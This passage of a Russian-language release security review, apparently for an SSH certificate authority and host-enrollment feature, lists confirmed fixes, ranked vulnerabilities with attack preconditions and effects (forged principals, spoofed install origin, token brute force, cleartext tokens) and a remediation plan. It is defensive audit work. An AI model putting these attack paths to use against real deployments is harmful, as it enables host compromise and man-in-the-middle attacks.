| Guard sshd-конфигурации (POSIX) | `validate_sshd` (`sshd -t`, в т.ч. `-C "include …"`) перед reload, откат `.ucmbak` при неудаче |
| Отвязка `current_cert_id` при удалении сертификата и блок удаления CA при живых managed hosts | `ssh_cert/management.py`, `ssh_ca_service.py:367-377` (перепроверено в этом раунде) |
| Naive/aware datetime в подписи сертификатов | `ssh_cert/signing.py`, `decode.py` — UTC нормализован (закрыто ранее, перепроверено) |
| Учёт managed hosts в backup-манифесте и при restore | `backup/manifest.py` (`ssh_managed_hosts` в `GENERIC_SECTIONS`) — таблица не теряется при бэкапе/восстановлении |
| Нет shell-инъекции в генерируемый инсталлер | Прогон P1: метасимволы в `Host` (`"`, `$`, backtick) вырезаются Werkzeug → в скрипт попадает `UCM_URL="http:"`; исполнение чужой команды не доказано ни в одном варианте |
| Каскад при удалении CA / хоста | Миграция 138 + `delete_host` не оставляет висячих сертификатов: сертификат остаётся привязанным к CA и виден в `/ssh/certificates` |

### 9.2 Дыры по убыванию критичности

| ID | Атака | Предпосылка | Эффект |
|---|---|---|---|
| **S1** | Поддельные principals при enroll | Одноразовый bootstrap-токен (утёк через access-лог прокси, скриншот, буфер обмена оператора; TTL 4 ч) + principals-политика CA wildcard-вида `*.lab.internal` | Host CA подписывает сертификат, действительный для **чужого** имени → MITM против клиентов, которым известен публичный ключ Host CA. Токен не даёт прав администратора и не даёт приватного ключа CA — но даёт право подписи на выбранное имя |
| **S2** | Подмена origin установки | Админ открывает UI по чужому `Host`/IP или через прокси, не объявленный в `UCM_TRUSTED_PROXIES`; команда копируется из UI | Хост скачивает runner с чужого сервера и выполняется против него с root'ом: утечка host-токена, поддельный host-сертификат, полная компрометация хоста |
| **S3** | Перебор токенов и безлимитный перевыпуск | Доступ из RFC1918/loopback (то есть из той же сети, где живут managed hosts): `RATE_LIMIT_TRUST_LAN` по умолчанию `true` снимает и flask-limiter, и `security.rate_limiter` | Брутфорс bootstrap/host-токенов без ограничения частоты; 6 подряд `/renew` → 7 живых сертификатов одного хоста, раздувание `ssh_certificates` и webhook-очередей |
| **S5** | KRL не применяется на хосте | Директивы sshd объявлены в дроп-ине `sshd_config.d/*.conf` | Отзывы пользователей не доходят до sshd, при этом UI сообщает «KRL synced». Отзыв компрометированного user-сертификата не работает |
| **S9** | Потеря SSH на Windows-хосте | Ошибка в записываемой директиве (путь с пробелом, битый конфиг) | `Restart-Service sshd` молча падает, бэкап не восстанавливается, хост без SSH; UCM показывает `online` |
| **M2** | Timing-сигнал по токену / деградация | Нет индекса на `bootstrap_hash` | Полный скан таблицы на каждый агентский запрос; косвенная утечка через время ответа |
| **M3** | Cleartext host-токен | `UCM_URL=http://…` (дефолт при выключенном ProxyFix) + exemption агентских путей из https-redirect | Токен и сертификат в открытом виде внутри LAN-сегмента; достаточно пассивного слушателя на пути |
| **M1** | Невидимость атак в аудите | Отказы агентской аутентификации не пишутся в `AuditService` | Перебор токенов не оставляет следов в журнале аудита и в compliance-отчётах |

### 9.3 Что в этом релизе безопаснее, чем раньше (перепроверено заново)
B1/B2 предыдущих раундов (shell-инъекция через hostname и слепой перезапись sshd_config) закрыты: метасимволы не
доходят до скрипта (P1), POSIX-агент validates-before-reload и уважает первое значение директивы.
Остаток по B2 — ровно `Include` (S5): `validate_sshd()` понимает Include, `directive_value()` — нет.

---

## 10. Порядок устранения (рекомендация менеджера)

**P0 — до релиза, обязательное (одна сессия разработки):**
1. S1: не принимать principals от агента (принципал = `hostname`) + ассерт-тест «присланный principals игнорируется».
2. S2: канонический origin (`get_admin_canonical_origin()` + валидация) вместо `request.url_root` в трёх местах.
3. S4: вернуть `revoke_certificate=True` по умолчанию (как в ТЗ) либо закрыть дыру запретом `Delete Host` при живом сертификате; и то и другое — по 3–5 строк.
4. S10 (версия/тег): снять конфликт `2.254.5-dev` с выпущенными `v2.254.5/v2.254.6`.

**P1 — релиз в текущем окне:** S3 (каденс-гард в `renew`), S5 (`sshd -T`), S6 (`krl_written` в check-in),
S8 (per_page/серверный поиск), S9 (валидация на Windows или отказ от автоправки), M1 (агентские отказы в аудит),
M2 (индекс на `bootstrap_hash`), M5 (`4 hours TTL` в i18n + `sshHosts.neverSeen` в 9 локалях), S7 (rotate/force-renew в UI).

**P2 — следующий итерационный срез:** M3 (HTTPS для агентских путей по умолчанию), M4 (домашняя работа по переводу
секции `sshHosts`, 25 мёртвых ключей × 9 локалей), M6 (TTL/порог продления в UI SSH CA), M7 (удалить
`PRE_RELEASE_CHECKLIST.md`, повторяемое — в `scripts/`), M8 (eslint warnings), M9/D-h (формулировка про sshd reload и `FIELD_ICONS`).

**Что НЕ нужно делать (защита от «отсебятины»):** не добавлять push-канал к хостам (запрещено #451), не вводить
быстрые чипы/пресеты TTL в UI, не делать отдельный «agent dashboard», не добавлять новые роли доступа — существующих
admin/viewer достаточно, 403 проверены.

---

## 11. Границы этой проверки (что осталось непроверенным)

- Ручная раскатка миграции 138 на реальном PostgreSQL-инстансе и на нативном (не контейнерном) стенде: проверялась
  только тестовая SQLite-обвязка. Разделы 1, 3, 5, 6 `docs/PRE_RELEASE_CHECKLIST.md` (реальный sshd, реальный systemd
  timer, реальный `ssh -o "CertificateFile=…" ssh host`) этим ревью не выполнялись.
- Реальный Windows-стенд с OpenSSH for Windows: S9 доказана чтением скрипта, не прогоном.
- Производительность `generate_krl` и `/ssh/agent-setup` на флите в тысячи хостов (N1, M2) — не измерялась.
- UI-скриншотная проверка (10 колонок на реальном разрешении, slide-over на мобильном) не делалась: соответствие
  проверялось по коду страницы и по гейтам токенов/компонентов.
- Поле `.codegraph` не индексировало часть тестовой обвязки — отдельные детали читались напрямую; это не влияет
  на выводы, перечисленные выше.

---

## 12. Что закрыто из предыдущих 10 раундов и перепроверено этим раундом

B1, B2 (частично → S5), I1–I9, M-серии, debt D11/D12 и T2-1 подтверждены закрытыми в коде: блок `delete_ca`
на managed hosts, отвязка `current_cert_id`, naive-UTC в подписи/декодировании, бакеты rate-limiter, классификация
публичных маршрутов, `_key_material` при отзыве, `ssh_managed_hosts` в backup-манифесте, валидация
`renew_threshold_percent` 1..90, `db.session.rollback()` при отказе principals-политики на enroll.
Повторно они не переоткрываются; новые находки этого документа — только то, что не наблюдалось в раундах 1–10.
